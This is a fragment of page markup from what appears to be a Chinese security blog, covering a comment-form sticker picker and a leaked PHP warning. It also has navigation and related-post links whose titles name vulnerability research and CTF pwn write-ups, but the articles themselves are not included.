src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/12.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-puzzled' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/13.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-agree' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/14.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-crazy' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/15.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-angry' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/16.jpg'/></div></div><div class='emotion-group d-none' index='3'><div class='emotion-item emotion-item-sticker' code='flower-flower' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/1.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-grass' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/2.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-leaf' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/3.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-star' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/4.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-sun' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/5.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-moon' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/6.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-water' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/7.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-heihei' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/8.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-lemon' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/9.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-birthday' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/10.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-sea' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/11.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-vegetable' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/12.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-tile' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/13.jpg'/></div><div class='emotion-item emotion-item-sticker' code='flower-utf' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/flower/14.jpg'/></div><div class='emotion-group-description'>Source: github.com/k4yt3x/flowerhd</div></div>	</div>
+	<div class="emotion-keyboard-bar">
+		<div class='emotion-group-name active' index='0'>颜文字</div><div class='emotion-group-name' index='1'>Emoji</div><div class='emotion-group-name' index='2'>小恐龙</div><div class='emotion-group-name' index='3'>花!</div>	</div>
+</div>									</div>
+			</div>
+			<input id="post_comment_captcha_seed" value="<br />
+<b>Warning</b>:  Undefined variable $commentCaptchaSeed in <b>/www/wwwroot/yhalo_cn/wp-content/themes/argon/comments.php</b> on line <b>231</b><br />
+" style="display: none;"></input>
+			<input id="post_comment_post_id" value="1978" style="display: none;"></input>
+		</form>
+	</div>
+</div>
+<div id="comment_edit_history" class="modal fade" tabindex="-1" role="dialog" aria-modal="true">
+	<div class="modal-dialog modal-lg">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h4 class="modal-title" style="font-size: 20px;"></h4>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">×</span>
+				</button>
+			</div>
+			<div class="modal-body" style="word-break: break-word;"></div>
+		</div>
+	</div>
+</div>
+<div id="comment_pin_comfirm_dialog" class="modal fade" tabindex="-1" role="dialog" aria-modal="true">
+	<div class="modal-dialog">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h4 class="modal-title" style="font-size: 20px;"></h4>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">×</span>
+				</button>
+			</div>
+			<div class="modal-body" style="word-break: break-word;"></div>
+			<div class="modal-footer">
+				<button type="button" class="btn btn-secondary btn-dismiss" data-dismiss="modal"></button>
+				<button type="button" class="btn btn-primary btn-comfirm"></button>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="https://yhalo.cn/1963/732%e5%ad%97%e8%8a%82%e6%8b%bf%e4%b8%8broot-%e4%b8%bb%e6%b5%81-linux-%e5%8f%91%e8%a1%8c%e7%89%88%ef%bc%9acopy-fail%ef%bc%88cve-2026-31431%ef%bc%89%e6%bc%8f%e6%b4%9e%e7%a0%94%e7%a9%b6/" rel="prev">732字节拿下主流 Linux Root：Copy Fail（CVE-2026-31431）漏洞研究</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="https://yhalo.cn/1985/cve-2026-43284-cve-2026-43500-%e5%9f%ba%e4%ba%8edirty-frag-%e7%9a%84%e5%88%a9%e7%94%a8%e7%a0%94%e7%a9%b6/" rel="next">CVE-2026-43284 / CVE-2026-43500 &#8212; 基于Dirty Frag 的利用研究</a></div></div><div class="related-posts card shadow-sm">
+                    <h2 class="post-comment-title" style="margin-top: 1.2rem;margin-left: 1.5rem;margin-right: 1.5rem;">
+                    <i class="fa fa-book"></i>
+			        <span>推荐文章</span>
+		            </h2>
+		            <div style="overflow-x: auto;padding: 1.5rem;padding-top: 0.8rem;padding-bottom: 0.8rem;}"><a class="related-post-card" href="https://yhalo.cn/618/uoftctf2025-pwn%e6%96%b9%e5%90%91%e5%a4%8d%e7%8e%b0/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">UoftCTF2025 pwn方向wp</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2025/11/UofTCTF2025_front.webp"/></a><a class="related-post-card" href="https://yhalo.cn/652/rctf2025-pwn-%e9%83%a8%e5%88%86%e9%a2%98%e8%a7%a3/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">RCTF2025 PWN 部分题解</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2025/11/254b0791-dc10-469f-8e8e-ff0b4f7f91b7.jpg"/></a><a class="related-post-card" href="https://yhalo.cn/2051/2026%e6%b9%be%e5%8c%ba%e6%9d%af%e5%86%b3%e8%b5%9b%e4%b8%aa%e4%ba%bawp/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">2026湾区杯决赛个人wp</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2026/09/3.jpg"/></a><a class="related-post-card" href="https://yhalo.cn/408/nepctf2025-wp/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">NepCTF2025 WP</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2025/07/media1.jpg"/></a><a class="related-post-card" href="https://yhalo.cn/675/ciscnccb2025%e5%88%9d%e8%b5%9b%e9%83%a8%e5%88%86%e9%a2%98%e8%a7%a3/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">CISCN&amp;CCB2025初赛部分题解</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2025/12/b7fd5266d0160924483948f2cae1cbeae7cd3436.webp"/></a><a class="related-post-card" href="https://yhalo.cn/660/wsl2-ubuntu-xfce-xrdp%ef%bc%9a%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2%e8%bf%9e%e4%b8%8d%e4%b8%8a-%e9%bb%91%e5%b1%8f-%e9%97%aa%e9%80%80-%e4%bb%bb%e5%8a%a1%e6%a0%8f%e4%b8%a2%e5%a4%b1/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">WSL2 + Ubuntu + XFCE + XRDP：远程桌面“连不上/黑屏/闪退/任务栏丢失”一次排坑记录（</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2025/12/c44961bf-6735-42d8-91b5-501c031c3d40.png"/></a><a class="related-post-card" href="https://yhalo.cn/1698/2026%e6%95%b0%e5%ad%97%e4%b8%ad%e5%9b%bd%e5%88%9b%e6%96%b0%e5%a4%a7%e8%b5%9b%e6%95%b0%e5%ad%97%e5%ae%89%e5%85%a8%e8%b5%9b%e9%81%93%e6%9a%a8%e4%b8%89%e6%98%8e%e5%b8%82%e7%ac%ac%e5%85%ad%e5%b1%8a/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">2026数字中国创新大赛数字安全赛道暨三明市第六届“红明谷”杯大赛&#8211;Pwn wp by Yhalo</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://yhalo.cn/wp-content/uploads/2026/04/屏幕截图-2026-04-01-191828.png"/></a><a class="related-post-card" href="https://yhalo.cn/270/%e5%9f%ba%e4%ba%8emcp%e7%9a%84%e6%a0%b8%e5%bf%83%e5%ad%a6%e4%b9%a0%e4%bb%a5%e5%8f%8a%e5%9c%a8-ida-pro-%e4%b8%ad%e7%9a%84-mcp-%e5%ae%9e%e7%8e%b0/"><div class="related-post-card-container has-thumbnail">
+							<div class="related-post-title clamp" clamp-line="3">基于MCP的核心学习以及在 IDA Pro 中的 MCP 实现</div>
+							<i class="related-post-arrow fa fa-chevron-right" aria-hidden="true"></i>
+							</div><img class="related-post-thumbnail lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi+P//PwNAgAEACPwC/tuiTRYAAAAASUVORK5CYII=" data-original="https://cdn.yhalo.cn/MCP/mcp1.png"/></a><a class="related-post-card" href="https://yhalo.cn/885/n1ctf-junior-2026-1-2-pwn%e9%83%a8%e5%88%86wp/"><div class="related-post-card-container has-thumbnail">
